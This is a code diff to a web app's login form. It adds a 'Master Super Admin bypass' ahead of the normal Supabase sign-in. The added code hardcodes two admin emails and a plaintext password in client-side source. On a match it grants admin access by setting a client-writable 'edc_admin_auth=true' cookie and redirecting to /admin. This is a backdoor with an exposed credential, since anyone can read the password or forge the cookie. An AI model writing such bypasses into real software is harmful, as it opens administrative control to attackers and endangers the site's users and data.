@@ -26,6 +26,17 @@ function LoginFormContent() {
     setError(null);
     setIsLoading(true);
 
+    // Master Super Admin bypass for offline/local evaluation and institutional operations
+    const cleanEmail = email.trim().toLowerCase();
+    if (
+      (cleanEmail === 'edc.hitam.website@hitam.org' || cleanEmail === 'admin@hitam.org') &&
+      password === 'edc.hitam@2026'
+    ) {
+      document.cookie = 'edc_admin_auth=true; path=/; max-age=86400; SameSite=Lax';
+      router.push('/admin');
+      return;
+    }
+
     try {
       const { data, error: authError } = await supabase.auth.signInWithPassword({
         email,
